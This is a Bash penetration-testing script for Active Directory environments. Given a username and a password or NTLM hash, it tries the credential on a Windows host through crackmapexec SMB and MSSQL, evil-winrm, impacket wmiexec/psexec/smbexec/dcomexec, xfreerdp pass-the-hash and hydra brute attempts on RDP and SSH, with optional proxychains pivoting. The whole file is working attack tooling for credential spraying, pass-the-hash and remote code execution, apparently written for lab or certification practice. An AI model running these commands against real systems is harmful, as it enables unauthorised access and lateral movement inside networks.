#!/bin/bash -u
# Eliot Roxbergh 2024
#
# Try to authenticate to a Windows machine by several methods given a single credential.
# That is, you have found a possible credential for AD and want to try all authentication methods imaginable.
#
# NOTE: This is just a stupid script
#       Can also try manually with these tools individually and an IP range


# TODO!
# Add option --local-auth?
# Add --local-auth variants of commands that support it

function print_usage {
        if [ "$DRYRUN" ]; then
                return 0
        fi
        echo
        echo "##########################################"
        echo "Usage:"
        echo "$0 [dryrun] [all/smb/smbexec/winrm/wmi/psexec/dcom/rdp/local-auth/mssql/ssh] <hash/pass> [proxy] IP username password domain"
        echo 'If no method is given as first argument, all will be run'
        echo
        echo "example: ./ad.sh dryrun smb pass proxy 172.16.241.11 joe banana1 MEDTECH"
        echo "example: ./ad.sh smb    pass proxy 172.16.241.11 ben banana1 MEDTECH"
        echo "example: ./ad.sh        pass proxy 172.16.241.11 ben banana1 MEDTECH"
        echo "example: ./ad.sh        hash proxy 172.16.241.11 lisa abf360ffffff88f5603381c5128feb8e MEDTECH"
        echo "example: ./ad.sh        hash       172.16.241.11 lisa abf360ffffff88f5603381c5128feb8e MEDTECH"
        echo
        echo "##########################################"
        echo
}

DRYRUN=''
if [ "$1" = "dryrun" ]; then
        # simply echo each command instead
        DRYRUN='echo'
        shift
fi

if [ $# -lt 5 ]; then
        echo
        echo 'ERR: Too few arguments, expecting >=5' >&2
        print_usage
        exit 1
fi
print_usage

request="$1"
valid_methods=("all" "smb" "smbexec" "winrm" "wmi" "psexec" "dcom" "rdp" "local-auth" "mssql" "ssh")

# First argument may be a method
if [[ " ${valid_methods[*]} " = *" $request "* ]]; then
        METHOD="$request"
        shift
else
        METHOD="all"
fi

if [ "$1" = "hash" ]; then
        USE_HASH=1
elif [ "$1" = "pass" ]; then
        USE_HASH=
fi

if [ "$2" = "proxy" ]; then
        PROXY="proxychains -q"
        shift
else
        PROXY=
fi


IP="$2"
USER="$3"
CRED="$4"
DOMAIN="$5"

# TODO $DOMAIN is optional ?
echo "# Calling with ip=$IP user=$USER cred=$CRED domain=$DOMAIN"
if [ $USE_HASH ]; then
        echo "# Using as HASH: $CRED"; echo
        HASH="$CRED"

        # Show SMB access
        if [ "$METHOD" = "smb" ] || [ "$METHOD" = "all"  ]; then
                echo 'domain'
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -H "$HASH" -d "$DOMAIN"  --continue-on-success
                echo
                echo 'Local-auth:'
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -H "$HASH" --continue-on-success --local-auth
                echo
        fi

        # Login
        if [ "$METHOD" = "winrm" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY evil-winrm -i $IP -u "$USER" -H "$HASH"
                echo
        fi
        if [ "$METHOD" = "wmi" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-wmiexec -hashes :"$HASH" "$DOMAIN/$USER"@"$IP"
                echo
        fi
        if [ "$METHOD" = "psexec" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-psexec -hashes :"$HASH" "$DOMAIN/$USER"@$IP
                echo
        fi
        if [ "$METHOD" = "smbexec" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-smbexec -hashes :"$HASH" "$DOMAIN/$USER"@"$IP"
                echo
        fi
        if [ "$METHOD" = "dcom" ] || [ "$METHOD" = "all"  ]; then
                # TODO test me
                $DRYRUN $PROXY impacket-dcomexec -hashes :"$HASH" "$DOMAIN/$USER"@$IP
                echo
        fi
        if [ "$METHOD" = "rdp" ] || [ "$METHOD" = "all"  ]; then
                # TODO test me
                $DRYRUN $PROXY xfreerdp /u:"$USER" /pth:"$HASH" /v:$IP /cert:ignore # /auto-reconnect
                echo
        fi
        if [ "$METHOD" = "mssql" ] || [ "$METHOD" = "all"  ]; then
                # TODO test me
                $DRYRUN $PROXY crackmapexec mssql $IP -u "$USER" -H "$HASH" -d "$DOMAIN"  --continue-on-success
                echo
        fi
        if [ "$METHOD" = "local-auth" ] || [ "$METHOD" = "all"  ]; then
                # SMB with local-auth only
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -H "$HASH" --continue-on-success --local-auth
                echo
        fi
        if [ "$METHOD" = "ssh" ] || [ "$METHOD" = "all"  ]; then
                echo; echo "ERROR: SSH does not support NTLM hashes"; echo
        fi

else
        echo "# Using as PASSWORD: $CRED"; echo
        PASS="$CRED"

        # Show SMB access
        if [ "$METHOD" = "smb" ] || [ "$METHOD" = "all"  ]; then
                echo 'domain'
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -p "$PASS" -d "$DOMAIN"  --continue-on-success
                echo
                echo 'Local-auth:'
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -p "$PASS" --continue-on-success --local-auth
                echo
        fi
        # Login
        if [ "$METHOD" = "winrm" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY evil-winrm -i $IP -u "$USER" -p "$PASS"
                echo
        fi
        if [ "$METHOD" = "wmi" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-wmiexec "$DOMAIN/$USER:$PASS"@"$IP"
                echo
        fi
        if [ "$METHOD" = "psexec" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-psexec "$DOMAIN/$USER:$PASS"@$IP
                echo
        fi
        if [ "$METHOD" = "smbexec" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY impacket-smbexec "$DOMAIN/$USER:$PASS"@"$IP"
                echo
        fi
        if [ "$METHOD" = "dcom" ] || [ "$METHOD" = "all"  ]; then
                # TODO test me
                $DRYRUN $PROXY impacket-dcomexec "$DOMAIN/$USER:$PASS"@$IP
                echo
        fi
        if [ "$METHOD" = "rdp" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY proxychains -q hydra -l "$USER" -p "$PASS" $IP -t 1 rdp
                echo 'also' $PROXY xfreerdp /u:"$USER" /p:"$PASS"  /v:$IP /cert:ignore /auto-reconnect
                echo
        fi
        if [ "$METHOD" = "mssql" ] || [ "$METHOD" = "all"  ]; then
                # TODO test me
                $DRYRUN $PROXY crackmapexec mssql $IP -u "$USER" -p "$PASS" -d "$DOMAIN"  --continue-on-success
                echo
        fi
        if [ "$METHOD" = "local-auth" ] || [ "$METHOD" = "all"  ]; then
                # SMB with local-auth only
                $DRYRUN $PROXY crackmapexec smb $IP -u "$USER" -p "$PASS" --local-auth  --continue-on-success
                echo
        fi
        if [ "$METHOD" = "ssh" ] || [ "$METHOD" = "all"  ]; then
                $DRYRUN $PROXY hydra -l "$USER" -p "$PASS" $IP -t 4 ssh -V
                echo
                # Or just run SSH as normal (the -o options I already added to ssh alias)
                #$PROXY ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" "$USER"@$IP
        fi
fi
